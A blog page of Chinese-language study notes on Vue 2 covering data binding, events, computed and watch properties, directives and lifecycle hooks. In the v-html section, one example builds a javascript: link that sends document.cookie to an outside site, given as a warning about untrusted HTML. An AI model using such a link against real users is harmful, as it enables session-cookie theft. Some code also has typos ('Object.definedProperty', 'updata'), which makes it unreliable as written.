<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-vue2-0-3-0" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/03/25/vue2-0-3-0/" class="article-date">
  <time class="dt-published" datetime="2022-03-24T16:12:49.000Z" itemprop="datePublished">2022-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/03/25/vue2-0-3-0/">vue2.0+3.0</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="vue特点"><a href="#vue特点" class="headerlink" title="vue特点:"></a>vue特点:</h4><p>采用组件化(一个.vue文件)模式 提高代码复用率，让代码更好维护<br>无需直接操作dom,提高开发效率<br>虚拟dom(如果数据有变化，就会有帮助 将新的数据和旧的数据对比（diff算法），相同的会保留下来,新的数据再放上去)+Diff算法  尽量复用dom节点（原来有的，依然在用）</p>
<h4 id="生产版，开发板版的区别："><a href="#生产版，开发板版的区别：" class="headerlink" title="生产版，开发板版的区别："></a>生产版，开发板版的区别：</h4><p>开发版(包含完整的警告和调试模式)<br>生产版(删除了警告  项目写完了，要上线的时候 体积更小)</p>
<h4 id="安装DevTools："><a href="#安装DevTools：" class="headerlink" title="安装DevTools："></a>安装DevTools：</h4><p>生态系统 -&gt;工具 -&gt;DevTools-&gt;Chrome Extension<br>右上角黑的图标-&gt;管理扩展程序 -&gt;开发者模式打开-&gt;最小化浏览器<br>把安装包按住拖到底部的浏览器</p>
<h4 id="阻止vue在启动时出现生产提示："><a href="#阻止vue在启动时出现生产提示：" class="headerlink" title="阻止vue在启动时出现生产提示："></a>阻止vue在启动时出现生产提示：</h4><p>（未使用vue-cli之前）<br>Vue.config.productionTip&#x3D;false;</p>
<h4 id="出现favicon-ico：404错误："><a href="#出现favicon-ico：404错误：" class="headerlink" title="出现favicon.ico：404错误："></a>出现favicon.ico：404错误：</h4><p>（未使用vue-cli之前）<br>127.0.0.1代表本机<br>在vscode中点击 Open with live Server时 会在本机5500的端口上开了一台内置的小服务器，并且在整个工程(所有文件夹和文件)作为这台服务器的根资源去使用</p>
<p>把.icon的图标放在根路径下</p>
<h4 id="hello-world小案例"><a href="#hello-world小案例" class="headerlink" title="hello world小案例:"></a>hello world小案例:</h4><p>当data中的数据发生改变  整个模板会被重新解析<br>（未使用vue-cli之前）</p>
<div  id='root'
（（name））） <div 使用 （（）） 后可直接读取data里面的数据


<p>script&gt;</p>
<p>new Vue({ 创建vue实例<br>el:’#root’ 把工作成果放在id为root的盒子里面 值通常为css选择器字符串也可以写成<br>document.getElementById(“root”)<br>data:{ 数据供el所指定的容器使用 值暂时写成一个对象<br>name:’尚硅谷’<br>}</p>
<p>})</p>
<p>root容器里面依然复合html规范，只不过混入了一些特殊的vue语法<br>root容器里面的代码被称为Vue模板</p>
<p>先有容器，然后再有Vue实例 当Vue实例开始工作的时候 把整个容器拿过来  拿过来之后解析 看有没有特殊的语法(如:{  {}} 如果有就在data中查找，找到后就用对应的值把容器里面{  {…}}替换掉</p>
<p>容器与实例只能是1对1的关系</p>
  xxx要写js表达式，且xxx可以自动读取到data中所有的属性

<p>js表达式与js语句的区别:<br>js表达式：一个表达式会产生一个值，可以放在任意一个需要值的地方<br>如:a<br>a+b<br>demo(1)<br>x&#x3D;&#x3D;y?’a’:’b’</p>
<p>js代码(语句):<br>if（）{}<br>for(){}<br>&lt;&#x2F;script</p>
<h4 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法:"></a>模板语法:</h4><p>&lt;a v-bind:href&#x3D;’url’  前面有v-bind,后面的引号里面会当成js表达式执行<br>也可简写成 &lt;a :href&#x3D;’url’<br>还能够指定别的属性 &lt;a v-bind:href&#x3D;’url’ v-bind:x&#x3D;’hello’</p>
<p>…<br>data:{<br>url:’<a target="_blank" rel="noopener" href="http://www.atguigu.com&/#39;">www.atguigu.com&#39;</a><br>hello:’你好’<br>}</p>
<h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定:"></a>数据绑定:</h4><p>前面的v-bind是单向数据绑定 ：只能是data中的数据改变 去影响页面中的数据改变<br>，而如果页面中的数据改变，是不会影响到data中的数据改变</p>
<p>v-model为双向数据绑定 但不是所有元素都支持v-model,<br>v-model只能应用在表单类元素上(输入类元素)<br>&lt;input v-model:value&#x3D;’m’<br>因为v-model默认收集就是value值，所以可以简写成<br>&lt;input v-model&#x3D;’m’</p>
<h4 id="el与data的两种写法"><a href="#el与data的两种写法" class="headerlink" title="el与data的两种写法:"></a>el与data的两种写法:</h4><p>（未使用vue-cli之前）<br>el:<br>指定容器除了<br>const v&#x3D;new Vue({<br>el:’#root’<br>}</p>
<p>还可以 v.$mount(“#root”)</p>
<p>data:<br>data:{}可以是对象式</p>
<p>data：function(){ 也可以是函数式 并且必须返回一个对象<br>console.log(this) this为Vue实例对象 但如果是箭头函数形式就是全局window<br>return {<br>name:’尚硅谷’<br>}<br>}</p>
<p>一个重要原则:由Vue管理的函数(如 函数式的data)一定不要写成箭头函数，一旦写了,this就不是Vue实例了</p>
<h4 id="MVVM模型"><a href="#MVVM模型" class="headerlink" title="MVVM模型:"></a>MVVM模型:</h4><p>M (模型Model): 对应data中的数据<br>V (View)视图：模板<br>VM (视图模型 ViewModel):Vue实例对象</p>
 xxx 只要是Vue实例里面的属性都能看到  包括Vue原型链上的
<p>使用方式  直接  不需要加上 实例vm.</p>
<h4 id="底层原理-Object-defineProperty："><a href="#底层原理-Object-defineProperty：" class="headerlink" title="底层原理 Object.defineProperty："></a>底层原理 Object.defineProperty：</h4><p>给一个对象添加&#x2F;定义属性<br>数据劫持，数据代理，计算属性都由用到过:</p>
<p>参数1: 给谁添加<br>参数2:添加什么属性<br>参数3:配置项</p>
<p>let person&#x3D;{  这种方式 可删除，枚举，修改<br>name:’张三’<br>}<br>Object.defineProperty(person,’age’,{<br>value:18</p>
<p>})  这种方法定义的属性默认为不可枚举（不可遍历）<br>如果想让定义的属性可以枚举</p>
<p>Object.defineProperty(person,’age’,{<br>value:18<br>enumerable:true  (默认值为false,不可枚举)<br>})</p>
<p>writable:true(默认值为false，不可修改   即使做了修改操作，也不会报错，但不会影响原值)<br>configurable:true(默认值为false，不可删除   即使做了删除操作，也不会报错，但不会删除原值)</p>
<p>案例:<br> let number&#x3D;1;<br>var obj&#x3D;{age：number}<br>当number修改时  obj中age的值不会自动的修改<br>而是 还需手动执行  obj.age&#x3D;number;<br>太麻烦</p>
<p>有一种简单操作:<br>Object.definedProperty(obj,”age”,{<br>get:function(){<br>return number}<br>})</p>
<p>每次访问age属性，都会触发get函数（getter）的调用,且返回值就是age的值</p>
<p>当有人修改age属性值时,set函数（setter）会被调用，且返回值就是age的值（改变后的值）</p>
<p>Object.definedProperty(obj,”age”,{<br>set:function(value){<br>number&#x3D;value;<br>}<br>})</p>
<p>vscode应用商店里好用的提示插件：Vue3 Snippets</p>
<h4 id="数据代理"><a href="#数据代理" class="headerlink" title="数据代理:"></a>数据代理:</h4><p>什么是数据代理:<br>通过一个对象代理对另一个对象中属性的操作(读&#x2F;写)<br>obj2                       obj&#x3D;{x：1}</p>
<p>let obj&#x3D;{x:100}<br>let obj2&#x3D;{y:200}</p>
<p>Object.defineProperty(obj2,’x’,{<br>get(){<br>return obj.x;<br>},<br>set(value){<br>obj.x&#x3D;value;<br>}<br>})</p>
<p>Vue里的数据代理:<br>vm._data就是指 实例中的data 但内部做了数据劫持<br>vm._data&#x3D;&#x3D;&#x3D;data  :true(前提是这个data放在了全局)</p>
<p>关键的一步:把data中的数据放到vm身上一份（为了编码更方便 省略了 _data.name中的_data）</p>
<p>整个基本原理:<br>通过Object.defineProperty()把data中的所有属性添加到vm上<br>为每一个添加到vm身上的属性添加setter和getter<br>在setter和getter内部去操作（读&#x2F;写）data中对应的属性</p>
<h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理:"></a>事件处理:</h4><p>事件里面绑定的函数 （）可加可不加，但如果是插值语法必须加 如<p>{ {demo() }}&lt;&#x2F;p</p>
<p>点击时触发: &lt;button v-on:click&#x3D;”showInfo()” &lt;&#x2F;button<br>可简写成  &lt;button @click&#x3D;”showInfo”&gt;&lt;&#x2F;button</p>
<p>new Vue({<br>el:’#root’<br>document.getElementById(“root”)<br>data:{<br>name:’尚硅谷’<br>},<br>methods:{<br>showInfo(a){<br> 此处的this是vm（Vue实例对象） 这里的第一个参数（当没有传入参数的时候）是事件对象 可以获取a.target.innerText<br>}</p>
<p>如果想传入参数并且不会丢失event<br>&lt;button @click&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  参数位置可以互换，不影响<br>}</p>
<h4 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符:"></a>事件修饰符:</h4><p>阻止事件默认行为:<br>methods:{<br>showInfo(event){<br>event.preventDefault();<br>}<br>或者<br>&lt;button @click.prevent&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button  (.prevent对点击事件click进行修饰)</p>
<p>阻止事件冒泡:<br>methods:{<br>showInfo(event){<br>event.stopPropagation();<br>}<br>或者<br>&lt;button @click.stop&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.once事件只触发一次<br>&lt;button @click.once&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.capture 事件的捕获模式 (事件开始从外往里面开始执行)<br>&lt;button @click.capture&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.self只有event.target是当前操作的元素对象时才触发事件（触发事件的前提条件是   事件对象为当前元素 包含不算）<br>&lt;button @click.self&#x3D;”showInfo(1,$event)”&gt;&lt;&#x2F;button </p>
<p>.passive（优先响应默认行为） 事件的默认行为会立即执行 无需等待事件回调函数执行完毕</p>
<div @scroll='demo'></div  滚动条 滚动时触发


<div @wheel='demo'></div   鼠标的滚轮 滚动时触发
当触发鼠标滚轮时 会执行对应函数  等函数中代码执行完后(这里如果出现一些很棒花时间的循环语句，会造成页面卡顿 ) 才会触发默认行为（滚动台向上/下移动一丢丢）

<div @wheel.passive='demo'></div  可以解决卡顿问题 （scroll事件本事就是先响应默认行为)

<p>v-model的三个修饰符:<br> .number: 让文本框中得到的结果为数字型，而不是默认的字符串<br>&lt; input type&#x3D;’number’ v-model.number&#x3D;’userInfo.age’ </p>
<p>.lazy:失去焦点时再收集<br>&lt; textarea v-model.lazy&#x3D;’userInfo.other’&gt;</p>
<p>.trim: 去掉首位空格</p>
<h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件:"></a>键盘事件:</h4><p>@keydowm :按下 没有抬起来<br>@keyup:按下 并且松手了</p>
<p>&lt;input @keyup.enter&#x3D;’’&gt;<br>松手后并且回车了才触发 这里的enter为按键别名</p>
<p>类似的按键别名还有:<br>delete:删除或退格<br>esc:退出<br>space:空格<br>tab:换行(特殊 必须配合keydown去使用 本身就可以移出焦点)<br>up:上<br>down:下<br>left：做<br>right:右</p>
<p>如果时多个单词组成的别名:<br>如CapsLock  需要用-分开<br>&lt;input @keyup.caps-lock&#x3D;’’&gt;</p>
<p>系统修饰键:(用法特殊)<br>ctrl alt shift meta<br>&lt;input @keyup.ctrl&#x3D;’’&gt;<br>按下修饰键的同时 再按下其他键 随后释放其他键 事件才被触发<br>需要  如同时按下ctrl +y  然后松开 才会触发 ctrl+i 也行 …<br>还可以 指定其他键<br>&lt;input @keyup.ctrl.y&#x3D;’’&gt; </p>
<h4 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性:"></a>计算属性:</h4><p>底层原理:接住了Object.definedProperty()里面的getter和setter<br>拿着已经写完的属性（data中的数据）去加工去计算，然后生成一个全新的属性</p>
<p>data里面放的是是属性<br>computed里面放的是计算属性（也在vm身上 和data中的数据一样可直接写在插值语法中）</p>
<p>当第一次读取计算属性的值时  会被缓存起来   后面再访问就会走缓存路线<br>对比之下 methods读取几次就会执行几次 没有任何缓存</p>
<p>data：{<br>firstName:’张’,<br>lastName:’三’<br>},<br>computed:{<br>当有人读取fullName时,get就会被调用,且get函数的返回值就是fullName的值<br>get什么时候被调用?(计算属性数据什么时候发生变化)1 初次读取时 2 所依赖的数据发生变化时<br>fullName:{<br>get（）{</p>
<p>return  this.firstName+’-‘+this.lastName<br>},<br>如果fullName可能会被改 如 vm.fullName&#x3D;1; 那么set函数必须写<br>set(value){<br>const arr&#x3D;value.split(“-“);<br>this.firstName&#x3D;arr[0];<br>this.lastName&#x3D;arr[1];<br>}<br>}</p>
<p>methods:{<br>fullName:function（）{<br>return  this.firstName+’-‘+this.lastName</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p></p


<p>计算属性简写形式（如果确定了只读 不改）</p>
<p>computed:{<br>fullName(){ 这个函数会直接当成get函数用<br>return  this.firstName+’-‘+this.lastName<br>},</p>
<h4 id="监视-侦听-属性"><a href="#监视-侦听-属性" class="headerlink" title="监视(侦听)属性:"></a>监视(侦听)属性:</h4><p>对比计算属性:<br>计算属性时不能开启异步任务来维护数据，而监视属性可以（不靠return 语句来返回数据）<br>computed能完成的功能，watch都能完成,watch能完成的功能，computed不一定能完成(如watch可以异步操作 ：setTimeout(function(){})，1000)</p>
<p>当watch,computed都能实现的时候，优先使用computed</p>
<p>对于计算属性里面的值也可以进行监测<br>监视属性必须存在才能监视（如果不存在，也不会报错）<br>data:{<br>isCold:true,<br>}<br>watch：{<br>isCold（认定为’isCold’）:{<br>immediate:true,初始化时让handle执行一次<br>handler(newValue,oldValue){当isCold属性发生改变时，会触发handler函数<br>}<br>}</p>
<p>监视的第二种写法<br>vm.$watch(‘isCold’,{</p>
<p>immediate:true,<br>handler(newValue,oldValue){<br>}</p>
<p>})<br>两个重要原则:<br>所有被vue管理的函数，最好写成普通函数，这样this的指向才是vm或者组件实例对象<br>所有不被vue管理的函数（定时器的回调函数，ajax的回调函数,promise的回调函数）,最好写成箭头函数，这样this的指向才是vm或者组件实例对象</p>
<h4 id="深度监视："><a href="#深度监视：" class="headerlink" title="深度监视："></a>深度监视：</h4><p>data:{<br>number:{ vue监视中 如果地址值没有变化，会默认number没有变化，所以不会触发对应的函数，vue 中的watch默认不会看地址值里面的内容<br>a:1,<br>b:2<br>}<br>}<br>watch:{<br>‘number.a’:{ 监视多级结构中 某个 属性的变化<br>handler（）{</p>
<p>}</p>
<p>watch:{<br>number:{<br>deep:true   开启了深度监视      监视多级结构中 所有 属性的变化<br>handler（）{</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>简写形式（当配置项只有handler时才可以）<br>watch:{<br>number（newValue,oldValue）{ 这个函数相当于handler函数</p>
<p>}</p>
<p>或者<br>将<br>vm.$watch(‘isCold’,{</p>
<p>immediate:true,<br>handler(newValue,oldValue){<br>}</p>
<p>})<br>简写成<br>vm.$watch(‘isCold’,function(newValue,oldValue){</p>
<p>})</p>
<h4 id="绑定class样式"><a href="#绑定class样式" class="headerlink" title="绑定class样式:"></a>绑定class样式:</h4><div class='basic' :class='a' 动态样式绑定 适用于类名不确定

<p>data:{<br>a:’normal’<br>}</p>
<p>style<br>.normal{<br>…<br>}</p>
<p>或者 数组写法 &lt;div class&#x3D;’basic’ :class&#x3D;’arr’  适用于 个数不缺名 名字不确定</p>
<p>data:{<br>arr:[‘atguigu1’,’atguigu2’,’atguigu3’]<br>}</p>
<p>style<br>.atguigu1{}<br>.atguigu2{}</p>
<p>也可以</p>
<div class='basic' :class='[a,b,c]'
data:{
a:'atguigu1',
b:'atguigu2'
或者 对象写法 适用于个数确定 名字也确定
<div class='basic' :class='classObj'
data:{
classObj:{
atguigu1:false,
atguigu2:false
}
也可以
<div class='basic' :class='{atguigu1:false,atguigu2:false}'>


<h4 id="绑定style样式"><a href="#绑定style样式" class="headerlink" title="绑定style样式:"></a>绑定style样式:</h4><p style='{fontSize:fsize+"px"}'

<p>对象写法<br>data:{<br>fsize:40<br>} 通常改成</p>
<p style='styleObj'>

<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}<br>}<br>或者数组形式</p>
<p style='[styleObj,styleObj2]'

<p>data:{<br>styleObj:{<br>fontSize:’40px’<br>}，<br>styleObj2:{<br>backgroundColor:green;<br>}<br>}</p>
<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染:"></a>条件渲染:</h4><p v-show='true'> 为true时显示 为false隐藏  （底层为 调整display的值  为false时 元素节点还在）
<p v-show='1==3'> 隐藏


<p v-if='false'> (为false时 元素节点都会消失) (底层：通过增加 删除节点)
<p v-else-if='false'> 
<p v-else> （v-else后面即使有条件也无效 不需要跟任何内容）

<p>如果有很高的切换频率，使用v-show<br>频率低的 有v-if<br>另外 v-if时有惰性的  如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染 相比之下 v-show 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p>
<p>template只能和v-if连用 不能和v-show一起使用<br>&lt; template v-if&#x3D;’a&#x3D;&#x3D;&#x3D;1’&gt;<br>&lt; p&gt; 123&lt; &#x2F;p&gt;<br>&lt; &#x2F;template&gt;</p>
<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染:"></a>列表渲染:</h4><ul
<li v-for='p in persons' :key='p.id'> {  {p. ...}}</li 
key的作用：让每一个li拥有了一个唯一的标识（前面只有加了: 后面才会被当成表达式处理）
或者
<li v-for='（p,index） in persons' :key='index'>  (把 in 换成 of也行)

<p>data:{<br>persons:[{},{},{}]<br>}</p>
<p>或者 也可以遍历对象</p>
<li v-for='（p,k） in car' :key='k'>  (这里p 指 属性值  k表示属性名) (把 in 换成 of也行)

<p>data:{<br>car：{<br>name：1，<br>price:2,<br>color:3<br>}<br>}</p>
<p>v-for也可以遍历字符串</p>
<p>也可以遍历次数<br>如  v-for&#x3D;’(a,b) of 5’<br>a 为 1 2 3 4 5<br>b 为 0 1 2 3 4</p>
<h4 id="key的作用与原理"><a href="#key的作用与原理" class="headerlink" title="key的作用与原理:"></a>key的作用与原理:</h4><p>把初始数据生成虚拟dom（真实dom身上没有key,但虚拟dom身上一定会有key）(此时页面啥也没有，只是内存中出现了虚拟节点)<br>然后将虚拟dom转换为真实dom<br>用户开始输入内容，数据开始更新，出现了新的数据<br>根据新的数据，生成 新的虚拟dom</p>
<p>然后进行虚拟dom对比算法（称为diff算法,将新的与旧的虚拟dom对比，此时依赖的就是key）（举例 ： ，&lt;li key&#x3D;’0’ 老王 20  &lt;input type&#x3D;’text’&lt;&#x2F;li’如果对比之后  如果节点中key值一样，就会拿来对比  先对比文本节点 然后对比标签节点， 如果标签名一样，标签结构一样，所有属性都一样不会去考虑文本节点一不一样，最终对比结果就是一样的  可如果文本节点不同，就会把新的虚拟dom转化为真实dom,但input元素这部分和旧的是一样的，用的是旧的虚拟dom生成的真实dom） </p>
<p>使用index作为key不是一定会有问题，如果对数据进行了破坏顺序的操作（如数组中往前面加元素，会造成破坏，而往后面添加则不会，因为此时的key为数组的索引值）</p>
<p>如果不写key,遍历时的索引值会默认最为key值</p>
<p>key值最好用唯一标识(id,身份证号)</p>
<h4 id="更新时的一个问题-监视数据的一个原理"><a href="#更新时的一个问题-监视数据的一个原理" class="headerlink" title="更新时的一个问题(监视数据的一个原理):"></a>更新时的一个问题(监视数据的一个原理):</h4><p>对象中后追加的属性，Vue默认不做响应式处理<br>如这种情况的改变vue监测不到:<br>data:{<br>persons:[{},{},{}],<br>},<br>methods:{<br>updataMei(){<br>this.person[0]&#x3D;{…}  不奏效 (如果只是数组中某一个元素 的某一个属性做赋值是没问题的  如this.person[0].name&#x3D;123 是可以的)<br>但这样写可以  this.person.splice(0,1,{…})<br>}</p>
<p>}<br>如果显示结果为undefined,那么页面不会报错，但也不会有显示</p>
<p>数组更新监测:<br>Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：</p>
<p>push()<br>pop()<br>shift()<br>unshift()<br>splice()<br>sort()<br>reverse()</p>
<p>如果是对象更新:<br>data:{<br>student:{name:’atguigu’},<br>},<br>methods:{<br>addSex(){<br>this.student.sex&#x3D;’男’； 不奏效<br>需要这样写   Vue.set(vm._data.student,…)<br>可以简写成   Vue.set(this.student,’sex’,’男’)<br>也可以  this.$set(….)  （这是对于对象）</p>
<p>用这种方式对于数组 （hobby:[‘你’,’猜’]）:<br> Vue.set(this.hobby,0,’我’) 0 表示元素的索引<br>}</p>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器:"></a>过滤器:</h4><p>对数据进行加工<br>并没有改变原本的数据，而是产生了新的数据<br>对v-model不适用<br>使用过滤器的场景: {  {xxx|过滤器名}}或者 v-bind:属性&#x3D;”xxx|过滤器名”</p>
<p>{  {time |timeFormatter}} 首先读取 time然后把这个当作参数传给 timeFormatter，调完这个函数后 拿到这个返回值 然后用这个返回值将原来整个替换掉</p>
<p>如果{  {time |timeFormatter（’a’）}} 有括号，并且里面有参数，将作为函数中的第二个参数传入，第一个还是time</p>
<p>filters:{ 与methods并列<br>timeFormatter（）{</p>
<p>}</p>
<p>也可以多个过滤器的串联:<br>{  {time |timeFormatter|mySlice}} 这里time不会直接传给mySlice,而是只能传给timeFormatter,timeFormatter执行完成之后的返回结果将作为mySlice的传入实参</p>
<p>filters:{<br>timeFormatter（）{<br>return …<br>},<br>mySlice(){<br>return …<br>}</p>
<p>上面是局部过滤器</p>
<p>下面是全局过滤器:<br>Vue.filter(‘mySlice’,function（）{<br>return …</p>
<p>})</p>
<h4 id="v-text-v-html指令"><a href="#v-text-v-html指令" class="headerlink" title="v-text,v-html指令:"></a>v-text,v-html指令:</h4><p>&lt; div v-text&#x3D;’’&gt;:</p>
<p>渲染文本内容， 会将所有的字符串当成正常的文本去解析，即使里面有标签也不会当成标签去解析</p>
<p>&lt; div v-html&#x3D;’str’&gt;:<br>与上面一样，但可以识别html的结构<br>v-html可以出现的危险的行为:</p>
<p>data:{<br>str:’&lt;a href&#x3D;javaScript:location.href&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com/?&quot;+document.cookie&#39;&gt;">http://www.baidu.com?&quot;+document.cookie&#39;&gt;</a>…</a><br>此时点击该标签 跳转时 会将当前网站上的所有cookie(如果用户没有勾选 …only)传给 指定的百度这个网站<br>一定要在可信的内容上使用v-html<br>永远不要用在在用户提交的内容上</p>
<h4 id="v-cloak指令-没有值"><a href="#v-cloak指令-没有值" class="headerlink" title="v-cloak指令(没有值):"></a>v-cloak指令(没有值):</h4><p>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性<br>使用css配合v-cloak可以解决网速慢时页面展示出未经解析的模板的问题<br>&lt; h2 v-cloak&gt;…&lt;&#x2F; h2&gt;</p>
<p>&lt; style&gt;<br>[v-cloak]:{<br>display:none;<br>}</p>
<h4 id="v-once指令"><a href="#v-once指令" class="headerlink" title="v-once指令:"></a>v-once指令:</h4><p>v-once所在节点在初次动态渲染后，就视为静态内容了<br>以后数据的改变不会引起v-once所在结构的更新<br>&lt; h2 v-once&gt;{  {n}}&lt; &#x2F;h2&gt;<br>data:{<br>n:1<br>}</p>
<h4 id="v-pre指令"><a href="#v-pre指令" class="headerlink" title="v-pre指令:"></a>v-pre指令:</h4><p>跳过所在节点的编译过程<br>使用场景:<br>没有使用插值语法的节点<br>没有使用指令语法</p>
<h4 id="自定义指令-函数式"><a href="#自定义指令-函数式" class="headerlink" title="自定义指令:函数式:"></a>自定义指令:函数式:</h4><p>如:定义一个v-big指令，将绑定的值放大10倍<br>&lt; h2&gt;放大10倍后n的值是：&lt; span v-big&#x3D;’n’&gt;&lt; &#x2F;span&gt;  &lt; &#x2F;h2&gt;<br>data:{<br>n：10</p>
<p>directives:{与methods同级<br>big(element,binding){element这里指&lt; span&gt;&lt; &#x2F;span&gt;  而binding是一个对象 其中一个是value属性 值为n<br>element.innerText&#x3D;binding.value*10; (这里函数里面不需要加return)</p>
<p>}</p>
<p>big函数何时会被调用:<br>指令与元素成功绑定时(一上来)(仅仅是内存中绑定了关系，此时页面中并没有出现该元素)<br>指令所在模板被重新解析时(data中有数据发生改变时)</p>
<h4 id="自定义指令：对象式"><a href="#自定义指令：对象式" class="headerlink" title="自定义指令：对象式"></a>自定义指令：对象式</h4><p>所有 指令  函数里面的this都是window</p>
<p>举例：自定义v-fbind指令 让input框自动获取焦点<br>&lt; span v-fbind：value&#x3D;’n’&gt;&lt; &#x2F;span&gt; </p>
<p>directives:{ 下面三个可以被称为钩子函数<br>fbind:{<br>bind(element,binding){<br>element.innerText&#x3D;binding.value<br>}， 指令与元素成功绑定时调用<br>inserted(element,binding){<br>element.focus();<br>}， 指令所在元素被插入页面时调用<br>updata(element,binding){<br>element.innerText&#x3D;binding.value}  指令所在模板被重新解析时调用<br>}</p>
<p>}</p>
<p>细节点:命名的问题<br>如 &lt; span v-bigNumber：value&#x3D;’n’&gt;&lt; &#x2F;span&gt; </p>
<p>directives:{ 下面三个可以被称为钩子函数<br>bigNumber:… 无效</p>
<p>可以这样但不推荐  bignumber:… </p>
<p>如 &lt; span v-big-number：value&#x3D;’n’&gt;&lt; &#x2F;span&gt;<br>directives:{<br>‘big-number’:…</p>
<p>上面时局部的指令</p>
<p>下面时全局的指令: 对象式<br>Vue.directive(‘fbind’,{</p>
<p>bind(element,binding){<br>element.innerText&#x3D;binding.value<br>}<br>inserted(element,binding){<br>element.focus();<br>}<br>updata(element,binding){<br>element.innerText&#x3D;binding.value}<br>}</p>
<p>或者 函数式<br>Vue.directive(‘bind’,function(){…})</p>
<p>总结:指令定义式不加v-,但使用时要加v-</p>
<h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期:"></a>生命周期:</h4><p>&lt; div id&#x3D;’root’&gt;1处&lt; &#x2F;div&gt;</p>
<p>el:’#root’<br>template:’&lt; div&gt;…. </div>‘  这里只能有一个根节点(这里写和在1处写是一样的效果)</p>
<p>生命周期函数中的this指向vm或组件实例对象</p>
<p>挂载流程 4个:</p>
<p>beforeCreate(){} 无法通过vm访问到data中的数据,data中的方法</p>
<p>created(){} 可以通过vm访问到data中的数据,data中的方法</p>
<p>beforeMount(){} 页面呈现的是未经Vue编译的dom结构，所有对dom的操作都不奏效</p>
<p>mounted(){} 页面呈现 的是经过Vue编译后的dom，对dom的操作均有效<br>与methods同级  Vue完成模板的解析并把真实dom元素放入页面后调用</p>
<p>常用于 发送ajax请求,开启定时器，绑定自定义事件等，</p>
<p>更新流程:<br>beforeUpdate(){}  此时 ，数据是新的,但页面是旧的，即页面还没有和数据保持同步 (之前是指  创建数据检测 数据代理之前)</p>
<p>updated(){}  数据是新的，页面也是新的，即页面和数据保持了同步</p>
<p>销毁流程:<br>销毁后，vm的工作成果还在，只是不会再接管页面了，无法有任何对页面的操作</p>
<p>会解绑全部指令和(自定义的)事件监听器</p>
<p>可以在方法里面 写 this.$destroy()</p>
<p>beforeDestroy(){}  这里对数据的所有修改，都不会触发页面更新 常用于清楚定时器 解绑自定义事件</p>
<p>destroyed(){}</p>
<h4 id="对组件的理解"><a href="#对组件的理解" class="headerlink" title="对组件的理解:"></a>对组件的理解:</h4><p>复用性</p>
<p>非单文件组件:一个文件里面有多个组件<br>创建组件:<br>const rain&#x3D;Vue.extend({<br>name：’atguigu’,这行代码作用 仅仅是开发者工具里呈现的组件名称<br>template:<code>&lt; div&gt;....&lt; /div&gt;</code><br>data(){<br>return {<br>schoolName:’’,<br>…<br>}<br>}<br>       组件中的 data如果是对象形式，那么复用的时候，是同一个对象，当自己修改的时候，别人的如果也复用了这个文件，data也会被更改（即避免组件复用时，存在引用关系）<br>但是vm实例可以写成对象形式<br>}</p>
<p>})</p>
<p>const shine&#x3D;….</p>
